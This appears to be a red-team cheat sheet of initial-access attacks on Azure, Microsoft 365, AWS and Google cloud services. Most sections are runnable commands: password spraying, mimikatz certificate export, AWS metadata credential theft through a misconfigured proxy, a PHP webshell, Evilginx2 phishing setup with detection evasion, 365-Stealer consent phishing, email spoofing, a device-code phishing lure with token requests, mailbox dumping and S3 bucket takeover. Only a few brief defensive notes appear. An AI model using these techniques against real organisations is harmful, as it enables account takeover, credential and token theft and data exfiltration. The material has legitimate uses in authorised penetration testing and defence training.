# Initial access attacks

* [Password and crentials attacks](#Password--and-credentials-attacks)
  * [Password spraying](#Password-spraying)
  * [Bypass MFA](#Bypass-MFA)
  * [Key disclosure in public repositories](#Key-disclosure-in-public-repositories)
  * [Reused access](#Reused-access)
  * [AWS Instance Metadata](#AWS-Instance-Metadata)
* [Web-Application Vulnerabilities](#Web-application-vulnerabilities)
  * [Insecure file upload](#Insecure-file-upload)
  * [Server Side Template Injection](#Server-Side-Template-Injection)
  * [OS Command injection](#OS-Command-injection)
* [Phishing](#Phishing)
  * [Teams](#Teams)
  * [Evilginx2](#Evilginx2)
  * [Illicit Consent Grant](#Illicit-Consent-Grant)
  * [Email Spoofing](#Email-spoofing)
  * [Azure Device Code](#Azure-Device-Code)
    * [Dynamic device code phishing](#Dynamic-device-code-phishing)
  * [Google workspace calendar event injection](#Google-workspace-calendar-event-injection)
* [Public storage](#public-storage)
  * [Azure storage accounts](#Azure-storage-accounts)
  * [AWS blobs](#AWS-blobs)
  * [Google Storage Buckets](#Google-Storage-Buckets)
* [Misc](#misc)

## Password and credentials attacks
### Password spraying
- https://github.com/dafthack/MSOLSpray
- https://github.com/ustayready/fireprox
- Also possible with https://github.com/0xZDH/o365spray
```
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
```

#### Find valid emails Azure
- Explained in Recon or use the command below
```
C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
```

#### Trevorspray
- https://github.com/blacklanternsecurity/TREVORspray

### Bypass mfa
#### MFAsweep
- Checks for portals which doesn't enforce mfa
- https://github.com/dafthack/MFASweep
```
Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
```

## Key disclosure in public repositories
- Scavange repos for keys
- Find keys in realtime: https://github.com/eth0izzle/shhgit
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog
- Common abuses
  - Secrets (Credentials, API keys, Tokens) in repositories
  - Compromising a user with commit rights
  - Hosting malware
  - Abusing GitHub actions and workflows to trigger builds/execute code or perform an action
    - Workflow can run in a VM

### Gitleaks
- https://github.com/zricethezav/gitleaks

#### Search for secrets
```
./gitleaks detect -v source <DIRECTORY> --report-path gitleaks-report.json
```

#### Use web browser to view the commit
```
https://github.com/[git account]/[repo name]/commit/[commit ID]
```

#### GitHub Personal Access Token
- A GitHub Personal Access Token starts with `github_pat_<TOKEN>`

## Reused access 
- certs as private keys on web servers
1. Comprimise web server
2. Extract certificate with mimkatz
3. Use it to authenticate to Azure
```
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

### AWS Instance Metadata
- Metadata endpoint is hosted on a non routable IP adress at 169.254.169.254
- Can contain access/secret keys to AWS and IAM credentials
- Server compromise or SSRF vulnerabilities might allow remote attackers to reach it.
- IAM credentials can be stored here ```http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>```
- New version requeres token, a put request is send and then responded to with a token. Then that token can be used to query data

#### Instance Metadata Service URL
```
http://169.254.169.254/latest/meta-data
```

#### Additional IAM creds possibly available here

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

#### IMDS Version 2 has some protections 
- but these commands can be used to access it
```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

## Web application vulnerabilities
- Here are some generic things ot look for:
  - Out of date web technologies with known vulns
  - SQL or command injection vulns
  - Server-side-request forgery (SSRF)
  - Arbitrary file upload
- Good place to start post shell:
  - Creds in metadata service
  - Certificates
  - Environment variables
  - Storage Accounts

### Insecure file upload
#### Upload a webshell to a insecure webapp
- Simple webshell
```
<?php
	system($_REQUEST['cmd']);
?>
```

#### Execute env
```
?cmd=env
```
- if the app service contains environment variables `IDENITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.

#### Exploit
- Go to [Exploitation Managed Identity](/cloud/azure/privilege-escalation.md#Managed-Identity)

### Server Side Template Injection
- SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side. 
- That is, we can get command execution on a server by abusing this.
- Find we webapp which is vulnerable, test with injectin a expression ```{{7*7}}``` and see if it gets evaluated.
- The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework. 
- Use ```{{config.items()}}``` and see if it works.

#### Execute env
```
?cmd=env
```
- if the app service contains environment variables `IDENITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.

#### Exploit
- Go to [Exploitation Managed Identity](/cloud/azure/privilege-escalation.md#Managed-Identity)

### OS Command injection
- In case of OS command injection, it is possible to run arbitrary operating  system commands on the server where requests are processed. 
- This is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests. 

#### Execute env
```
?cmd=env
```
- if the app service contains environment variables `IDENITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.

#### Exploit
- Go to [Exploitation Managed Identity](/cloud/azure/privilege-escalation.md#Managed-Identity)

## Phishing
### Teams
- By default Microsoft Teams has federation open with all external Teams organisations.
- This means that other Teams users from different Azure tenants can communicate to your employees directly and exchange messages or files. An attacker can leverage this feature to launch a Social Engineering attack against the victim user.
- Moreover, it is possible to bypass the message request approval by creating a Teams group chat rather than direct chat to the victim.

### Evilginx2
- https://github.com/kgretzky/evilginx2
- Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.

#### Start evilgix2
```
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
```

#### Configure the domain
```
config domain studentx.corp
```

#### Set the IP for the evilginx server
```
config ip xx.xx.xx.xx
```

#### Use the template for office365
```
phishlets hostname o365 <DOMAIN>
```

#### Verify the DNS entries
```
phishlets get-hosts o365
```

#### Copy the certificate and private key
0365.cr and 0365.key from ```C:\studentx\.evilginx\crt``` to ```C:\studentx\.evilginx\crt\login.studentx.corp```

#### Enable phishlets
```
phislets enable 0365
```

#### Create the phishing URL (Tied to an ID)
```
lures create 0365
```

#### Get the phishing URL
- Share the phishing URL with the victim
```
lures get-url <ID>
```

### Avoid detection
- Avoid detection by removing default Evilginx2 HTTP Header and white list outgoing and incoming IP addresses.

#### Change default redirect uri
```
vim config.go

#Change line with DEFAULT_REDIRECT_URL
```

#### Change the headers
```
vim http_proxy.go

# Comment the following lines
reg.Header.Set(string(hg) egg2)
reg.Header.Set(string(e), e_host)
reg.Header.Set(string(b), nothing_to_see_here)
```

#### Firewall
- Use CSFirewall or iptables to block VPS incoming and outgoing internet access (e.g Allow only Microsoft and the target IP addresses).

## Illicit Consent Grant
- Verified publisher: https://techcommunity.microsoft.com/t5/microsoft-entra-azure-ad-blog/publisher-verification-and-app-consent-policies-are-now/ba-p/1257374
- User Consent setting - "Allow user consent for apps from verified publishers, for selected permissions" (Note that this doesn't stop consent for applications from the same tenant as thetarget)

#### Check if users are allowed to consent to apps
- Requires a valid account in the target tenant
```
Import-Module AzureADPreview.psd1

#Use another tenant account
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

#output should be
ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```

#### Create a application
- Login to the Azure portal and in the left menu go to `Azure Active Directory` --> `App registrations` and click `New registration`
- Set a application name and choose `Accounts in any organizational directory (Any Azure AD Directory - Multitenant`
  - Choose `Accounts in this organizational directory only (<TENANT> only - Single tenant)` if you are executing the attack from inside the target tenant
- Fill in the URL (https://xx.xx.xx.xx/login/authorized) and click Register
- In the left menu go to `Certificates & Secrets` and create a new client secret and copy it.
- In the left menu go to `API permissions`. Click `Add a permission`, click `Microsoft Graph` and `Delegated permissions` and add the desired permission. For example: `Files.ReadWrite, Mail.Read,  Mail.Send, offline_access, User.Read, User.ReadBasic.All`

### Setup attacking tool
- Such as https://github.com/CoasterKaty/PHPAzureADoAuth
- or https://github.com/AlteredSecurity/365-Stealer

### 365 stealer
- Follow the setup at: [https://github.com/AlteredSecurity/365-Stealer](https://github.com/AlteredSecurity/365-Stealer#setup-365-stealer)
- Start Xammp and go to http://localhost/365-stealer/yourVictims/ then click `365-Stealer configuration`. Fill in the `Client ID`, `Client Secret` and `Redirect URI`
- Start 365-Stealer `Python .\365-Stealer.py --run-app`

#### Get the phishinglink
- Browse to https://localhost and click on readmore. Copy the link!

#### Send phishinglink to targets

#### Get the access tokens
- Browse to http://localhost:82/365-Stealer/yourvictims/
- Click on the user and copy the access token from access_token.txt

#### Get admin consent
- https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent
- Global Admin, Application Admin, or Cloud Application Administrator can all grant tenant wide application admin consent
```
- In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
- Refish the user to get a token with the extra permissions
```

#### Start a listener
```
nc.exe -lvp 4444
```

#### Abuse the access token - Uploading word doc to OneDrive
```
cd C:\xampp\htdocs\365-Stealer\

& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload <PATH TO DOC> --token-path C:\xampp\htdocs\365-Stealer\yourVictims\<USER>\access_token.txt
```

#### Refresh all tokens
- Access token is valid for 1 hour, can't be revoked.
- Refresh token is valid for 90 days but can be revoked.
```
python 365-Stealer.py --refresh-all
```

### Email spoofing
- https://www.blackhillsinfosec.com/spoofing-microsoft-365-like-its-1995/
- Microsoft Direct Send is the feature that can be utilised to send spoofing emails.
- The benefits for the the attackers is that the Direct Send feature requires NO authentication and can be sent from OUTSIDE of the organisation.
- There are only 2 prerequisites: Microsoft 365 subscription and Exchange Online Plan

```
Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subject “Subject Here” -To ‘Full Name <user2@companyDomain.com>‘ -From ‘From Full Name <user1@companyDomain.com>‘ -Body “Hello From your Co-worker” -BodyAsHtml
```

### Azure Device Code
- Device Code is used to login to devices that have input validations
- Flow:
	- Enter code on device on https://microsoft.com/devicelogin
	- Perform normal authentication, including MFA as user
	- On successful login the device gets access and refresh tokens
	- [MS link](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code#protocol-diagram)
- Links
  - https://aadinternals.com/post/phishing/
  - https://www.offsec-journey.com/post/phishing-with-azure-device-codes
  - https://www.youtube.com/watch?v=GZ_nn0uRLr4
  - https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html
- Block device auth flow: https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows

#### Manually request device code
- Code is only valid for 15 minutes!
- There are multiple methods to request device codes. A few examples below:
- Manually version 1 API
  - Scope = all default permissions and `offline_access`
  - The scope `offline_access` instructs the Azure AD to return a refresh token in addition to an access token and ID token.
  - Copy the `user_code`
  - Can replace `common` in url with `consumers`, `organizations`, `tenant ID` or `tenant domain`

```
$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$Resource = "https://graph.windows.net/"

$body = @{
	"client_id" = $ClientID 
	"resource" = $Resource
}

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body

Write-Output $authResponse
```

- Manually version 2 API
```
$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$Scope = ".default offline_access"

$body = @{
	"client_id" = $ClientID 
	"scope" = $Scope
}

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body

Write-Output $authResponse
```

- Graphspy https://github.com/RedByte1337/GraphSpy
	- Go to device codes and generate one
```
python.exe .\GraphSpy-master\GraphSpy\GraphSpy.py
```


- Tokentactics https://github.com/rvrsh3ll/TokenTactics
```
Import-Module .\TokenTactics.psd1

Get-AzureToken -Client MSGraph
```

#### Common application ID's
- https://learn.microsoft.com/en-us/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in
```
ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
AEM-DualAuth 	69893ee3-dd10-4b1c-832d-4870354be3d8
ASM Campaign Servicing 	0cb7b9ec-5336-483b-bc31-b15b5788de71
Azure Advanced Threat Protection 	7b7531ad-5926-4f2d-8a1d-38495ad33e17
Azure Data Lake 	e9f49c6b-5ce5-44c8-925d-015017e9f7ad
Azure Lab Services Portal 	835b2a73-6e10-4aa5-a979-21dfda45231c
Azure Portal 	c44b4083-3bb0-49c1-b47d-974e53cbdf3c
AzureSupportCenter 	37182072-3c9c-4f6a-a4b3-b3f91cacffce
Bing 	9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7
CPIM Service 	bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4
CRM Power BI Integration 	e64aa8bc-8eb4-40e2-898b-cf261a25954f
```

#### Send device code to the target
- Email example:
```
Dear <USER>,

Use the Code to access the content of the website: https://microsoft.com/devicelogin

Code: <CODE>
```

#### Request access token
- Uses the device code from `$authResponse.device_code`
- Manually version 1 API
```
$GrantType = "urn:ietf:params:oauth:grant-type:device_code"

$body=@{
	"client_id" = $ClientID
	"grant_type" = $GrantType
	"code" = $authResponse.device_code
	"resource" = $Resource
}

$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$GraphAccessToken = $Tokens.access_token

$GraphAccessToken
```

- Manually version 2 API
```
$GrantType = "urn:ietf:params:oauth:grant-type:device_code"

$body=@{
	"client_id" = $ClientID
	"grant_type" = $GrantType
	"code" = $authResponse.device_code
}
$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
$GraphAccessToken = $Tokens.access_token

$GraphAccessToken 
```

- Graph spy and token tactics automatically pulls for the access token

#### Post exploitation
- Example dump mailbox with TokenTactics:
```
Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
AllItems
```

### Dynamic device code phishing
- Dynamically request codes and give them to the user on a webpage to
- https://www.blackhillsinfosec.com/dynamic-device-code-phishing/

#### Defense
- Logs
  - Attacker IP and device that is logged in Entra ID Sign-in logs
  - Sign in with Authentication Protocol: Device Code
- Conditional Access
  - Location based policy
  - Block device code flow [Documentation](https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows)

### Google workspace calendar event injection
- Silently injects events to target calendars
- Bypasses the “don’t auto-add” setting
- Include link to phishing page
- https://www.blackhillsinfosec.com/google-calendar-event-injection-mailsniper/

## Public Storage
### Find data in public storage
- https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.
- https://github.com/jordanpotti/CloudScraper can scan all three cloud services for multiple services.

### Azure storage accounts
#### Google Dorks
```
site:github.com “StorageConnectionString” “DefaultEndpointsProtocol”
site:http://blob.core.windows.net
```

#### Enumerate Azureblobs
- add permutations to permutations.txt like common, backup, code in the misc directory.
```
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base <COMPANY NAME>
```
- Access the URL's and see if any files are listed (Example `https://<STORAGE NAME>.blob.core.windows.net/backup?restype=container&comp=list`)
- Access the files by adding it to the url (Example `https://<STORAGE NAME>.blob.core.windows.net/backup/blob_client.py`)
- Check for a SAS URL, if found then open the "Connect to Azure Storage", select "blob container" and select 'Shared Access Signatur (SAS)' and paste the URL, displayname will fill automatically.
- Another example: https://<STORAGE NAME>.blob.core.windows.net/<container-name>?restype=container&comp=list

### AWS blobs
- https://github.com/RhinoSecurityLabs/pacu

#### Brute force bucket names
- https://github.com/initstring/cloud_enum
```
python3 cloud_enum.py -k <KEYWORD>
```

#### Use the AWS CLI to list the files of the s3 bucket
```
sudo aws s3 ls s3://<BUCKET> --profile <PROFILE>
```

#### Use the AWS CLI to download the files of the s3 bucket
```
sudo aws s3 sync s3://<BUCKET> s3-files-dir --profile <PROFILE>
```

### Google Storage Buckets
- https://github.com/initstring/cloud_enum

### Public SQL database
- https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.
- Might be able to bruteforce port 1433

## Misc
## S3 code injection
- If a webapp is loading content from an s3 bucket made publicly writeable. Attackers can upload malicious JS to get executed by visitors.

## Domain hijacking
- Hijack S3 domain by finding references in a webapp to S3 buckets that dont exist anymore.
- Or subdomains were linked to S3 buckets with CNAME that still exist.
- When assessing webapps look for 404's to ```*.s3.amazonaws.com```
1. When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error
2. Go create the S3 bucket with the same name and region
3. 3. Load malicious content to the new S3 bucket that will be executed when visitors hit the site
